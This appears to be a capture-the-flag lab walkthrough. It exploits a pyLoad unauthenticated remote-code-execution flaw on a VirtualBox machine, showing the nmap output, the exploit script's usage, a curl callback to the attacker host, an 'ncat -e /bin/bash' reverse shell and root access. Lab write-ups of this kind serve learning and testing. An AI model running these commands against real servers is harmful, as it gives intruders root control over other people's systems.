_____

# Walkthrough for Pyloader

## Enumeration

- Running a full port scan on `nmap`

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
9666/tcp open  http    CherryPy wsgiserver
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Cheroot/8.6.0
| http-title: Login - pyLoad
|_Requested resource was /login?next=http://192.168.1.33:9666/
MAC Address: 08:00:27:5D:CB:59 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Port 9666 is open. Heading to `http://192.168.1.33:9666` , it waits for some time and then redirects me to a login page which is located at `http://192.168.1.33:9666/login?next=http://192.168.1.33:9666/`.

Searching for `pyload` on google, we came across to the following exploit db entry [https://www.exploit-db.com/exploits/51532](https://www.exploit-db.com/exploits/51532).

It is an unauthenticated RCE, We don't need any credentials.

## Exploitation

We can use it like below,

```bash
└─# python3 exploit.py
usage: exploit.py [-h] -u URL -c CMD
exploit.py: error: the following arguments are required: -u, -c
```

```bash
└─# python3 exploit.py -u 'http://192.168.1.33:9666' -c 'curl 192.168.1.44:1234'                      
[+] Check if target host is alive: http://192.168.1.33:9666
[+] Host up, let's exploit!
```

```bash
└─# nc -lvnp 1234

Listening on 0.0.0.0 1234
Connection received on 192.168.1.33 42372
GET / HTTP/1.1
Host: 192.168.1.44:1234
User-Agent: curl/7.81.0
Accept: */*
```

After verifying that exploit works we can go ahead and get a shell

```bash
└─# python3 exploit.py -u 'http://192.168.1.33:9666' -c 'ncat -e /bin/bash 192.168.1.44 1234'    
[+] Check if target host is alive: http://192.168.1.33:9666
[+] Host up, let's exploit!
```

We got code execution as root directly.

```bash
└─# nc -lvnp 1234   

Listening on 0.0.0.0 1234
Connection received on 192.168.1.33 55976
whoami
root
python3 -c 'import pty;pty.spawn("/bin/bash")'
root@pyloader:~/.pyload/data#
root@pyloader:~/.pyload/data# cat /root/proof.txt

..
```
